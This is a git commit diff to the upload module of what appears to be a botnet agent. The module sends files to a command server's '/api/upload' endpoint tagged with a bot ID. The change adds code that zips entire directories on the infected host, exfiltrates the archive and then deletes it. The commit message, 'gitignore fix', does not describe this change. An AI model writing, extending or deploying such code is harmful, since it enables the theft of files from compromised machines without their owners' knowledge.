a3817603255852bad5d983e61370a3bb9643b83d
Kevin LOCATI <kevin.locati@gmail.com>
2015-11-28 17:22:22 +0100

    gitignore fix

--- agent/modules/upload.py
+++ agent/modules/upload.py
@@ -1,13 +1,21 @@
 import requests
 import os
+import shutil
 
 import utils
 import settings
 
 
-def run(filename):
-    r = requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': os.path.basename(filename)}, files={'uploaded': open(filename, 'rb')})
-    utils.send_output(r.text)
+def run(path):
+    filename = os.path.basename(path)
+    if os.path.isdir(path):
+        arch_path = shutil.make_archive(filename, 'zip', path)
+        r = requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': os.path.basename(arch_path)}, files={'uploaded': open(arch_path, 'rb')})
+        utils.send_output(r.text)
+        os.remove(arch_path)
+    else:
+        r = requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': filename}, files={'uploaded': open(path, 'rb')})
+        utils.send_output(r.text)
 
 
 def help():
